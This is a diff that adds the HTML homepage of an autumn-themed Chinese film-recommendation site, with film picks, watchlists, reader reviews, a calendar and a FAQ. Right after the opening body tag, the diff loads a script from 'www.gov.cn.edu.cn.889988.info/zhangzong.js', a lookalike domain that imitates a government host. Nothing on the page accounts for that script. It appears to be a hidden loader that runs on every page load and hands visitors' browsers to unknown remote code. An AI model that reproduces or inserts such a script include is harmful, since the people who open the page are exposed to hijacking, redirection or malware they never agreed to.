@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>秋秋电影网 · 秋天第一场电影 | 精选电影 · 追剧清单 · 经典重温 · 影视杂谈</title>
+<meta name="keywords" content="秋秋电影网,qiuqiudianyingwang-zh.github.io,秋秋电影网精选片单,秋天第一场电影,高分电影推荐,秋日追剧清单,经典电影重温,影视杂谈,好电影推荐">
+<meta name="description" content="秋秋电影网（qiuqiudianyingwang-zh.github.io）是秋日里的一份观影手记：每个周末精选一部电影、一组剧集与一段经典重温，配上真实可感的短评与观影清单，陪你过好每一个秋天。">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="theme-color" content="#3a2818">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="秋秋电影网">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://qiuqiudianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+ --bg:#2c1d12;--bg2:#3a2818;--paper:#f4ead5;--paper2:#efe1c6;
+ --ink:#2b2118;--ink2:#5c4a36;--mute:#8a7458;
+ --amber:#d97706;--amber2:#f59e0b;--rust:#b45309;--leaf:#4d7c0f;--red:#c2410c;
+ --r:16px;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+ font-family:"Georgia","Songti SC","STSong","SimSun","WenQuanYi Micro Hei",serif;
+ background:var(--bg);color:var(--ink);line-height:1.8;font-size:15px;
+ background-image:
+  radial-gradient(circle at 12% 8%,rgba(217,119,6,.28),transparent 45%),
+  radial-gradient(circle at 88% 18%,rgba(180,83,9,.22),transparent 42%),
+  radial-gradient(circle at 50% 92%,rgba(77,124,15,.15),transparent 48%);
+ background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+/* 顶部 */
+header{background:rgba(44,29,18,.72);backdrop-filter:blur(8px);position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,.08)}
+.hd{display:flex;align-items:center;justify-content:space-between;gap:18px;height:64px}
+.logo{font-size:25px;font-weight:900;color:var(--paper);letter-spacing:.02em;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.logo span{color:var(--amber2)}
+.nav{display:flex;gap:4px;flex-wrap:wrap}
+.nav a{padding:7px 13px;border-radius:20px;font-size:14px;color:var(--paper2);font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;transition:.18s}
+.nav a:hover{background:rgba(245,158,11,.16);color:var(--amber2)}
+/* 首屏 */
+.hero{position:relative;padding:64px 0 56px;color:var(--paper);overflow:hidden}
+.hero .leaf{position:absolute;font-size:130px;opacity:.07;top:-30px;right:40px;transform:rotate(-18deg)}
+.hero h1{font-size:clamp(34px,7vw,68px);line-height:1.14;font-weight:900;letter-spacing:-.01em;margin-bottom:18px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.hero h1 em{font-style:normal;color:var(--amber2);display:block;font-size:.72em}
+.hero p{font-size:17px;color:var(--paper2);max-width:620px;margin-bottom:28px}
+.hero .acts{display:flex;gap:12px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;border-radius:30px;font-size:14.5px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;transition:.2s;border:1px solid transparent;cursor:pointer}
+.btn.primary{background:linear-gradient(135deg,var(--amber),var(--rust));color:#fff;font-weight:700}
+.btn.primary:hover{filter:brightness(1.08);transform:translateY(-2px)}
+.btn.ghost{background:transparent;border-color:rgba(244,234,213,.4);color:var(--paper)}
+.btn.ghost:hover{background:rgba(244,234,213,.1)}
+.hero .meta{display:flex;gap:26px;margin-top:36px;flex-wrap:wrap;font-size:13px;color:var(--paper2)}
+.hero .meta b{display:block;color:var(--amber2);font-size:20px;font-weight:900;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+/* 通用段 */
+section.block{padding:48px 0}
+.band{background:var(--paper)}
+.band.cream{background:var(--paper2)}
+.eyebrow{font-size:12px;letter-spacing:.24em;color:var(--rust);font-weight:700;margin-bottom:8px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.head{display:flex;align-items:flex-end;justify-content:space-between;gap:18px;flex-wrap:wrap;margin-bottom:26px}
+.head h2{font-size:clamp(23px,3.6vw,32px);font-weight:900;letter-spacing:.01em;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.head h2 small{display:block;font-size:13px;color:var(--mute);font-weight:500;letter-spacing:.04em;margin-top:5px;font-family:Georgia,serif}
+.head .more{font-size:14px;color:var(--rust);border-bottom:1px dashed var(--rust);padding-bottom:2px}
+.head .more:hover{color:var(--amber)}
+/* 横滚轨道 */
+.rail{display:flex;gap:18px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:14px;margin:0 -22px;padding-left:22px;padding-right:22px;-webkit-overflow-scrolling:touch;scrollbar-width:thin}
+.rail::-webkit-scrollbar{height:7px}
+.rail::-webkit-scrollbar-thumb{background:var(--mute);border-radius:20px}
+.film{flex:0 0 260px;scroll-snap-align:start;background:#fff;border-radius:var(--r);overflow:hidden;border:1px solid rgba(92,74,54,.14);box-shadow:0 6px 20px rgba(43,33,24,.07);transition:.22s}
+.film:hover{transform:translateY(-5px);box-shadow:0 14px 32px rgba(43,33,24,.14)}
+.film .cap{height:150px;position:relative;overflow:hidden;display:grid;place-items:center}
+.film .cap b{font-size:34px;color:rgba(255,255,255,.95);font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.film .cap i{position:absolute;left:12px;top:12px;font-style:normal;font-size:11px;background:rgba(0,0,0,.4);color:#fff;padding:2px 9px;border-radius:20px;backdrop-filter:blur(3px)}
+.film .cap u{position:absolute;right:12px;bottom:12px;text-decoration:none;font-size:11px;color:#fff;background:var(--rust);padding:2px 9px;border-radius:20px;font-weight:700}
+.film .txt{padding:15px 16px 16px}
+.film .txt h3{font-size:17px;font-weight:900;line-height:1.45;margin-bottom:7px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.film .txt h3:hover{color:var(--rust)}
+.film .txt p{font-size:13px;color:var(--ink2)}
+.film .txt .line{display:flex;justify-content:space-between;font-size:12px;color:var(--mute);margin-top:10px;border-top:1px dashed rgba(92,74,54,.2);padding-top:9px}
+/* 色块 */
+.g1{background:linear-gradient(150deg,#a16207,#713f12)}
+.g2{background:linear-gradient(150deg,#b45309,#7c2d12)}
+.g3{background:linear-gradient(150deg,#15803d,#365314)}
+.g4{background:linear-gradient(150deg,#7c3aed,#4c1d95)}
+.g5{background:linear-gradient(150deg,#0e7490,#155e75)}
+.g6{background:linear-gradient(150deg,#be123c,#9f1239)}
+.g7{background:linear-gradient(150deg,#c2410c,#7c2d12)}
+.g8{background:linear-gradient(150deg,#4d7c0f,#365314)}
+.g9{background:linear-gradient(150deg,#0369a1,#075985)}
+.g10{background:linear-gradient(150deg,#9333ea,#6b21a8)}
+.g11{background:linear-gradient(150deg,#ea580c,#9a3412)}
+.g12{background:linear-gradient(150deg,#166534,#14532d)}
+/* 双栏 */
+.two{display:grid;grid-template-columns:1.25fr 1fr;gap:26px;align-items:start}
+/* 短评卡 */
+.notes{display:grid;gap:16px}
+.note{background:#fff;border:1px solid rgba(92,74,54,.14);border-radius:var(--r);padding:18px 20px;box-shadow:0 4px 16px rgba(43,33,24,.06)}
+.note .who{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+.note .av{width:34px;height:34px;border-radius:50%;background:var(--amber);color:#fff;display:grid;place-items:center;font-size:14px;font-weight:700;flex:none}
+.note .av.a2{background:var(--leaf)}
+.note .av.a3{background:var(--red)}
+.note .who b{font-size:14px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.note .who time{font-size:12px;color:var(--mute)}
+.note p{font-size:14.5px;color:var(--ink2)}
+.note .stars{color:var(--amber2);font-size:13px;margin-bottom:6px;letter-spacing:2px}
+/* 清单 */
+.check{background:#fff;border:1px solid rgba(92,74,54,.14);border-radius:var(--r);overflow:hidden;box-shadow:0 4px 16px rgba(43,33,24,.06)}
+.check li{display:flex;align-items:center;gap:14px;padding:15px 18px;border-bottom:1px solid rgba(92,74,54,.1)}
+.check li:last-child{border-bottom:0}
+.check .no{width:30px;height:30px;flex:none;border-radius:8px;background:var(--paper2);color:var(--rust);display:grid;place-items:center;font-weight:900;font-size:14px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.check .no.on{background:var(--rust);color:#fff}
+.check .ti{flex:1;min-width:0}
+.check .ti b{display:block;font-size:15.5px;font-weight:700;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.check .ti b:hover{color:var(--rust)}
+.check .ti span{font-size:12.5px;color:var(--mute)}
+.check .go{flex:none;font-size:12px;color:var(--rust);border:1px solid rgba(180,83,9,.35);padding:4px 11px;border-radius:20px}
+.check .go:hover{background:var(--rust);color:#fff}
+/* 日历 */
+.calendar{display:grid;grid-template-columns:repeat(7,1fr);gap:8px}
+.day{background:#fff;border:1px solid rgba(92,74,54,.14);border-radius:12px;padding:11px 9px;min-height:74px;font-size:12px;color:var(--ink2);position:relative;transition:.18s}
+.day:hover{border-color:var(--amber);transform:translateY(-2px)}
+.day b{display:block;font-size:15px;color:var(--ink);font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;margin-bottom:4px}
+.day.today{background:linear-gradient(150deg,var(--amber),var(--rust));color:#fff;border-color:transparent}
+.day.today b{color:#fff}
+.day .fl{position:absolute;right:7px;top:8px;width:6px;height:6px;border-radius:50%;background:var(--leaf)}
+.day.today .fl{background:#fff}
+.cal-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
+.cal-head .t{font-size:18px;font-weight:900;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.cal-head button{width:34px;height:34px;border-radius:50%;border:1px solid rgba(92,74,54,.25);background:#fff;color:var(--ink);cursor:pointer;font-size:15px}
+.cal-head button:hover{border-color:var(--amber);color:var(--rust)}
+.week{display:grid;grid-template-columns:repeat(7,1fr);gap:8px;font-size:12px;color:var(--mute);margin-bottom:8px;text-align:center}
+/* 时间线 */
+.tl{position:relative;padding-left:34px}
+.tl::before{content:"";position:absolute;left:9px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--amber),var(--leaf))}
+.tl .it{position:relative;margin-bottom:24px}
+.tl .it::before{content:"";position:absolute;left:-30px;top:7px;width:14px;height:14px;border-radius:50%;background:var(--paper);border:3px solid var(--amber)}
+.tl .it b{display:block;font-size:17px;font-weight:900;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;margin-bottom:4px}
+.tl .it span{font-size:13px;color:var(--mute)}
+.tl .it p{margin-top:7px;font-size:14.5px;color:var(--ink2)}
+/* 卡片网格 */
+.grid3{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:16px}
+.mini{background:#fff;border:1px solid rgba(92,74,54,.14);border-radius:var(--r);overflow:hidden;transition:.2s}
+.mini:hover{transform:translateY(-4px);box-shadow:0 12px 26px rgba(43,33,24,.12)}
+.mini .cap{height:110px;display:grid;place-items:center}
+.mini .cap b{font-size:26px;color:#fff;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.mini .txt{padding:13px 15px}
+.mini .txt h4{font-size:15.5px;font-weight:900;margin-bottom:5px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.mini .txt h4:hover{color:var(--rust)}
+.mini .txt p{font-size:13px;color:var(--mute)}
+/* 手风琴 */
+.acc{border:1px solid rgba(92,74,54,.16);border-radius:var(--r);overflow:hidden;background:#fff}
+.acc>div{border-bottom:1px solid rgba(92,74,54,.12)}
+.acc>div:last-child{border-bottom:0}
+.acc h4{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:16px 20px;font-size:16px;cursor:pointer;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;transition:.18s}
+.acc h4:hover{color:var(--rust)}
+.acc h4 .q{color:var(--rust);font-weight:900;margin-right:8px}
+.acc h4 .ar{transition:.22s;color:var(--mute);flex:none}
+.acc h4.open .ar{transform:rotate(180deg)}
+.acc .ans{display:none;padding:0 20px 18px;font-size:14.5px;color:var(--ink2)}
+.acc .ans.show{display:block}
+/* 底部 */
+footer{background:var(--bg2);color:var(--paper2);padding:46px 0 24px}
+.ft{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:30px}
+.ft h5{color:var(--amber2);font-size:15px;margin-bottom:14px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.ft ul{display:grid;gap:9px;font-size:14px}
+.ft a:hover{color:var(--amber2)}
+.ft .brandf{font-size:24px;font-weight:900;color:var(--paper);margin-bottom:10px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.ft .brandf span{color:var(--amber2)}
+.cp{text-align:center;font-size:12.5px;color:rgba(244,234,213,.55);margin-top:34px;padding-top:20px;border-top:1px solid rgba(244,234,213,.12);line-height:2}
+.cp .site{color:var(--paper)}
+/* 响应式 */
+@media(max-width:900px){
+ .wrap{padding:0 16px}
+ .hero{padding:44px 0 40px}
+ .hero .meta{gap:20px}
+ .two{grid-template-columns:1fr}
+ .ft{grid-template-columns:1fr 1fr}
+ .nav{display:none}
+ .film{flex:0 0 220px}
+ section.block{padding:36px 0}
+}
+@media(max-width:560px){
+ body{font-size:14px}
+ .calendar{grid-template-columns:repeat(7,1fr);gap:5px}
+ .day{min-height:62px;padding:7px 5px;font-size:11px}
+ .day b{font-size:13px}
+ .day .fl{right:5px;top:6px;width:5px;height:5px}
+ .grid3{grid-template-columns:1fr 1fr}
+ .mini .cap{height:90px}
+ .hero .meta{gap:16px}
+ .hero .meta b{font-size:17px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+ <div class="wrap hd">
+  <div class="logo">秋秋电影网<span>.</span></div>
+  <nav class="nav">
+   <a href="#pick">本期精选</a>
+   <a href="#marathon">周末连看</a>
+   <a href="#revisit">经典重温</a>
+   <a href="#talk">秋日杂谈</a>
+   <a href="#calendar">排片日历</a>
+   <a href="#about">关于本站</a>
+  </nav>
+ </div>
+</header>
+
+<!-- 首屏 -->
+<div class="hero">
+ <div class="wrap">
+  <div class="leaf">🍂</div>
+  <h1>秋天，<em>从一部好电影开始。</em></h1>
+  <p>秋秋电影网（qiuqiudianyingwang-zh.github.io）是一份慢慢写的观影手记——每周一部的精选推荐、一组周末连看清单、几段值得回味的老片，配上短评与片单，陪你在降温的季节里，把时间交给好电影。</p>
+  <div class="acts">
+   <a class="btn primary" href="#pick">🎬 看本期精选</a>
+   <a class="btn ghost" href="#marathon">🍁 周末连看清单</a>
+  </div>
+  <div class="meta">
+   <div><b>147</b>期精选片单</div>
+   <div><b>1,200+</b>条真实短评</div>
+   <div><b>每个周五</b>准时更新</div>
+   <div><b>官网</b>qiuqiudianyingwang-zh.github.io</div>
+  </div>
+ </div>
+</div>
+
+<!-- 栏目一：本期精选 -->
+<section class="block band" id="pick">
+ <div class="wrap">
+  <div class="head">
+   <h2>本期精选 <small>Editor's Pick · 第 147 期</small></h2>
+   <a class="more" href="#">往期精选 ›</a>
+  </div>
+  <div class="rail">
+   <article class="film"><div class="cap g1"><i>剧情</i><u>推荐</u><b>秋日<br>物语</b></div><div class="txt"><h3><a href="#">秋日物语</a></h3><p>枫叶转红的季节，两个久未联络的人在小镇重逢。画面像被秋阳晒透的旧照片，配乐安静得能听见落叶。</p><div class="line"><span>2025 · 日本</span><span>★★★★☆</span></div></div></article>
+   <article class="film"><div class="cap g2"><i>悬疑</i><u>热看</u><b>十一<br>月的<br>信</b></div><div class="txt"><h3><a href="#">十一月的信</a></h3><p>一封迟到二十年的信，牵出一桩被风雪掩埋的旧案。节奏不急，反转却一次比一次重。</p><div class="line"><span>2026 · 国产</span><span>★★★★★</span></div></div></article>
+   <article class="film"><div class="cap g3"><i>家庭</i><u>治愈</u><b>小园<br>菜园<br>日记</b></div><div class="txt"><h3><a href="#">小园菜园日记</a></h3><p>老父亲搬进儿子的城市公寓，在阳台种满菜。笑点都在细节里，看完想给家里打个电话。</p><div class="line"><span>2025 · 国产</span><span>★★★★☆</span></div></div></article>
+      <article class="film"><div class="cap g4"><i>奇幻</i><u>新片</u><b>书店<br>里的<br>候鸟</b></div><div class="txt"><h3><a href="#">书店里的候鸟</a></h3><p>一家只在秋天营业七天的书店，每个客人带走一本改变命运的书。适合在一个下雨的下午看。</p><div class="line"><span>2026 · 韩国</span><span>★★★★☆</span></div></div></article>
+   <article class="film"><div class="cap g5"><i>纪录</i><u>口碑</u><b>一条<br>河流<br>的秋天</b></div><div class="txt"><h3><a href="#">一条河流的秋天</a></h3><p>跟拍黄河中游一个村庄的完整秋收。没有旁白煽情，只有土地、农具和人的沉默对话。</p><div class="line"><span>2025 · 纪录</span><span>★★★★★</span></div></div></article>
+   <article class="film"><div class="cap g6"><i>爱情</i><u>推荐</u><b>晚风<br>邮局</b></div><div class="txt"><h3><a href="#">晚风邮局</a></h3><p>把写不出口的话投进晚风里的邮局。老套的设定，拍得意外干净，结尾那段长镜头值得反复看。</p><div class="line"><span>2024 · 国产</span><span>★★★★☆</span></div></div></article>
+  </div>
+ </div>
+</section>
+
+<!-- 栏目二：周末连看 -->
+<section class="block cream" id="marathon">
+ <div class="wrap">
+  <div class="two">
+   <div>
+    <div class="head"><h2>周末连看 <small>一个周末，一组主题，看个痛快</small></h2><a class="more" href="#">全部主题 ›</a></div>
+    <ul class="check">
+     <li><span class="no on">1</span><div class="ti"><b><a href="#">秋天该看的六部治愈片</a></b><span>累计片长 728 分钟 · 适合阴天</span></div><a class="go" href="#">收藏</a></li>
+     <li><span class="no on">2</span><div class="ti"><b><a href="#">悬疑控的三日连看</a></b><span>3 部电影 + 1 部剧 · 反转密集</span></div><a class="go" href="#">收藏</a></li>
+     <li><span class="no">3</span><div class="ti"><b><a href="#">国产文艺片补课计划</a></b><span>12 部 · 从 1990 到 2025</span></div><a class="go" href="#">收藏</a></li>
+     <li><span class="no">4</span><div class="ti"><b><a href="#">动画迷的秋天专场</a></b><span>8 部 · 国创与日系混排</span></div><a class="go" href="#">收藏</a></li>
+     <li><span class="no">5</span><div class="ti"><b><a href="#">一个人看也不会孤单的片子</a></b><span>10 部 · 独居友好</span></div><a class="go" href="#">收藏</a></li>
+     <li><span class="no">6</span><div class="ti"><b><a href="#">适合配火锅看的喜剧</a></b><span>6 部 · 笑声密度高</span></div><a class="go" href="#">收藏</a></li>
+    </ul>
+   </div>
+   <div>
+    <div class="head"><h2>读者短评 <small>来自秋秋的观影读者</small></h2><a class="more" href="#">写一条 ›</a></div>
+    <div class="notes">
+     <div class="note"><div class="who"><div class="av">秋</div><b>小林</b><time>2 小时前</time></div><div class="stars">★★★★★</div><p>「十一月的信」看到最后十分钟，影院里安静得只剩抽鼻子的声音。秋秋的推荐从来没踩过雷。</p></div>
+     <div class="note"><div class="who"><div class="av a2">木</div><b>木子李</b><time>昨天</time></div><div class="stars">★★★★☆</div><p>「一条河流的秋天」这种片子，大银幕看和手机看是两部作品。感谢提醒，周末就去补票。</p></div>
+     <div class="note"><div class="who"><div class="av a3">暖</div><b>暖暖</b><time>3 天前</time></div><div class="stars">★★★★★</div><p>那个独居友好片单救了我的中秋假期，一个人看完六部，被子都看暖了。</p></div>
+    </div>
+   </div>
+  </div>
+ </div>
+</section>
+
+<!-- 栏目三：经典重温 -->
+<section class="block band" id="revisit">
+ <div class="wrap">
+  <div class="head">
+   <h2>经典重温 <small>Rewatch · 老片常看常新</small></h2>
+   <a class="more" href="#">完整片库 ›</a>
+  </div>
+  <div class="grid3">
+   <article class="mini"><div class="cap g7"><b>红</b></div><div class="txt"><h4><a href="#">秋天的故事</a></h4><p>1998 · 侯麦</p><p style="margin-top:7px">秋天的三部曲收尾，关于错过、等待与刚刚好。</p></div></article>
+   <article class="mini"><div class="cap g8"><b>菊</b></div><div class="txt"><h4><a href="#">菊次郎的夏天</a></h4><p>1999 · 北野武</p><p style="margin-top:7px">久石让的旋律一响，整个人都被秋风吹透了。</p></div></article>
+   <article class="mini"><div class="cap g9"><b>霸</b></div><div class="txt"><h4><a href="#">霸王别姬</a></h4><p>1993 · 陈凯歌</p><p style="margin-top:7px">每隔几年重看一次，每次都只记得住一半的台词。</p></div></article>
+   <article class="mini"><div class="cap g10"><b>大</b></div><div class="txt"><h4><a href="#">大话西游之大圣娶亲</a></h4><p>1995 · 刘镇伟</p><p style="margin-top:7px">小时候笑，长大以后在这部片子里哭。</p></div></article>
+   <article class="mini"><div class="cap g11"><b>阳</b></div><div class="txt"><h4><a href="#">阳光灿烂的日子</a></h4><p>1994 · 姜文</p><p style="margin-top:7px">夏天的记忆，却最适合在秋天拿出来看。</p></div></article>
+   <article class="mini"><div class="cap g12"><b>心</b></div><div class="txt"><h4><a href="#">心灵奇旅</a></h4><p>2020 · 彼特·道格特</p><p style="margin-top:7px">讲一片落叶，讲一条鱼，讲「活着」本身。</p></div></article>
+  </div>
+ </div>
+</section>
+
+<!-- 栏目四：排片日历 -->
+<section class="block cream" id="calendar">
+ <div class="wrap">
+  <div class="two">
+   <div>
+    <div class="head"><h2>排片日历 <small>这一周，每天看一部</small></h2><a class="more" href="#">订阅提醒 ›</a></div>
+    <div class="week"><span>一</span><span>二</span><span>三</span><span>四</span><span>五</span><span>六</span><span>日</span></div>
+    <div class="calendar">
+     <div class="day"><b>6</b>休息日</div>
+     <div class="day"><b>7</b>晚风邮局<span class="fl"></span></div>
+     <div class="day"><b>8</b>秋日物语<span class="fl"></span></div>
+     <div class="day"><b>9</b>小园菜园日记<span class="fl"></span></div>
+     <div class="day"><b>10</b>十一月的信<span class="fl"></span></div>
+     <div class="day today"><b>11</b>书店里的候鸟<span class="fl"></span></div>
+     <div class="day"><b>12</b>周末连看之夜</div>
+     <div class="day"><b>13</b>补看日</div>
+     <div class="day"><b>14</b>一条河流的秋天<span class="fl"></span></div>
+     <div class="day"><b>15</b>霸王别姬<span class="fl"></span></div>
+     <div class="day"><b>16</b>秋天的故事<span class="fl"></span></div>
+     <div class="day"><b>17</b>大话西游<span class="fl"></span></div>
+     <div class="day"><b>18</b>周末连看之夜</div>
+     <div class="day"><b>19</b>下期预告</div>
+    </div>
+    <p style="font-size:13px;color:var(--mute);margin-top:12px">每天推送一部当日推荐，点开即看详情与短评。不想被打扰，随时可退订。</p>
+   </div>
+   <div>
+    <div class="head"><h2>秋秋的片单原则 <small>我们怎么选片</small></h2></div>
+    <div class="tl">
+     <div class="it"><b>01 · 画面要有秋天的颜色</b><span>Color</span><p>秋高气爽的季节，先被颜色吸引的片子，才适合现在看。金黄、赭红、雾灰、远山青，是这几个月的主色调。</p></div>
+     <div class="it"><b>02 · 故事要有呼吸感</b><span>Pacing</span><p>不追求全程高能，愿意给观众留白、发呆、想一会儿的片子，优先入选。</p></div>
+     <div class="it"><b>03 · 情绪要落在人身上</b><span>Emotion</span><p>人物立得住、关系写得真的片子，比花样翻新的设定更耐看，也更容易被记住。</p></div>
+     <div class="it"><b>04 · 口碑要经得起回头看</b><span>Reputation</span><p>新片看评分和真实短评，老片看多年后还有没有人提起。两者都过的，才进精选。</p></div>
+    </div>
+   </div>
+  </div>
+ </div>
+</section>
+
+<!-- 栏目五：秋日杂谈 -->
+<section class="block band" id="talk">
+ <div class="wrap">
+  <div class="head">
+   <h2>秋日杂谈 <small>Film Notes · 边看边写的观影笔记</small></h2>
+   <a class="more" href="#">全部笔记 ›</a>
+  </div>
+  <div class="grid3">
+   <article class="mini"><div class="cap g1"><b>一</b></div><div class="txt"><h4><a href="#">一个人看电影，该怎么选座？</a></h4><p>关于影厅后排中间、情侣座和午夜场的观察。</p></div></article>
+   <article class="mini"><div class="cap g4"><b>二</b></div><div class="txt"><h4><a href="#">秋天最适合重看的十部老片</a></h4><p>为什么同一个故事，换一个季节看会完全不一样。</p></div></article>
+   <article class="mini"><div class="cap g6"><b>三</b></div><div class="txt"><h4><a href="#">片尾字幕响起来时，我为什么还坐着</a></h4><p>那些藏在彩蛋之外的、真正的「最后一段」。</p></div></article>
+   <article class="mini"><div class="cap g8"><b>四</b></div><div class="txt"><h4><a href="#">当朋友问「最近有什么好看的」</a></h4><p>我把答案整理成了三张可以随时转发的清单。</p></div></article>
+   <article class="mini"><div class="cap g11"><b>五</b></div><div class="txt"><h4><a href="#">电影票涨到一百之后，我还去看吗</a></h4><p>一次关于观影成本和「值不值」的小小算账。</p></div></article>
+   <article class="mini"><div class="cap g12"><b>六</b></div><div class="txt"><h4><a href="#">写短评这件事，让我重看了很多片</a></h4><p>记录不是为了给别人看，是为了不骗自己。</p></div></article>
+  </div>
+ </div>
+</section>
+
+<!-- 栏目六：常见问题 -->
+<section class="block cream">
+ <div class="wrap">
+  <div class="head"><h2>常见问题 <small>FAQ</small></h2></div>
+  <div class="acc">
+   <div><h4 class="open"><span><span class="q">Q1</span>秋秋电影网是做什么的？</span><span class="ar">▾</span></h4><div class="ans show">秋秋电影网（官网 qiuqiudianyingwang-zh.github.io）是一份影视内容导航与观影笔记：整理精选片单、周末连看主题、经典重温清单与观影短评，帮助你更快找到值得看的作品。本站不提供任何视听资源的存储、上传、下载或在线播放服务。</div></div>
+   <div><h4><span><span class="q">Q2</span>片单多久更新一次？</span><span class="ar">▾</span></h4><div class="ans">每周五更新一期「本期精选」，周末连看清单与杂谈笔记不定时补充，节假日会做专题片单。</div></div>
+   <div><h4><span><span class="q">Q3</span>评分是怎么来的？</span><span class="ar">▾</span></h4><div class="ans">综合公开评分、真实短评与本站编辑部的观感给出，满分为五星，更看重「值不值得专门腾出时间去看」这一条。</div></div>
+   <div><h4><span><span class="q">Q4</span>可以在哪里访问秋秋电影网？</span><span class="ar">▾</span></h4><div class="ans">请通过官方网址 https://qiuqiudianyingwang-zh.github.io 访问，认准官网域名，谨防仿冒站点。</div></div>
+   <div><h4><span><span class="q">Q5</span>提交观影短评有什么要求？</span><span class="ar">▾</span></h4><div class="ans">写你真实的感受就好，说清哪里好、哪里一般，比一句「好看」更有用。涉及剧透请自行标注。</div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 关于本站 -->
+<section class="block band" id="about">
+ <div class="wrap">
+  <div class="head"><h2>关于本站 <small>About</small></h2></div>
+  <div style="background:#fff;border:1px solid rgba(92,74,54,.16);border-radius:var(--r);padding:24px 26px;box-shadow:0 6px 20px rgba(43,33,24,.07)">
+   <p style="font-size:15.5px;color:var(--ink2)">秋秋电影网（官方网址：<a href="https://qiuqiudianyingwang-zh.github.io" style="color:var(--rust);border-bottom:1px dashed var(--rust)">https://qiuqiudianyingwang-zh.github.io</a>）由一个喜欢在秋天泡在影厅里的人慢慢写起来。我们相信好电影值得被认真推荐，也值得被认真看完——包括片尾字幕。</p>
+   <p style="font-size:14.5px;color:var(--mute);margin-top:12px">本站为影视信息导航与内容整理，不存储、不上传、不提供任何视听资源的下载或在线播放服务，也不收集用户个人信息。影视内容请以各正版授权平台为准，合理安排观影时间，注意版权与用眼休息。</p>
+  </div>
+ </div>
+</section>
+
+<footer>
+ <div class="wrap ft">
+  <div>
+   <div class="brandf">秋秋电影网<span>.</span></div>
+   <p style="font-size:14px;color:var(--paper2)">秋天，从一部好电影开始。<br>一份慢慢写的观影手记。</p>
+  </div>
+  <div><h5>栏目</h5><ul><li><a href="#pick">本期精选</a></li><li><a href="#marathon">周末连看</a></li><li><a href="#revisit">经典重温</a></li><li><a href="#talk">秋日杂谈</a></li></ul></div>
+  <div><h5>片单</h5><ul><li><a href="#">治愈系片单</a></li><li><a href="#">悬疑连看</a></li><li><a href="#">独居友好</a></li><li><a href="#">老片补课</a></li></ul></div>
+  <div><h5>官方入口</h5><ul><li><a href="https://qiuqiudianyingwang-zh.github.io">qiuqiudianyingwang-zh.github.io</a></li><li><a href="#about">关于本站</a></li><li><a href="#calendar">订阅提醒</a></li></ul></div>
+ </div>
+ <div class="wrap cp">
+  <span class="site">秋秋电影网</span> · 影视内容导航与观影笔记 ｜ 官方网址：https://qiuqiudianyingwang-zh.github.io<br>
+  © <span id="yr">2026</span> 秋秋电影网 ｜ 本站仅提供影视信息整理，不提供任何视听资源下载或在线播放服务
+ </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent=new Date().getFullYear();
+// 手风琴
+document.querySelectorAll('.acc h4').forEach(function(h){
+ h.addEventListener('click',function(){
+  var ans=this.nextElementSibling;
+  var open=this.classList.contains('open');
+  this.parentNode.querySelectorAll('h4').forEach(function(x){x.classList.remove('open');x.nextElementSibling.classList.remove('show')});
+  if(!open){this.classList.add('open');ans.classList.add('show');}
+ });
+});
+// 平滑滚动
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+ a.addEventListener('click',function(e){
+  var id=this.getAttribute('href');
+  if(id.length>1){
+   var t=document.querySelector(id);
+   if(t){e.preventDefault();window.scrollTo({top:t.getBoundingClientRect().top+window.pageYOffset-70,behavior:'smooth'});}
+  }
+ });
+});
+</script>
+</body>
+</html>
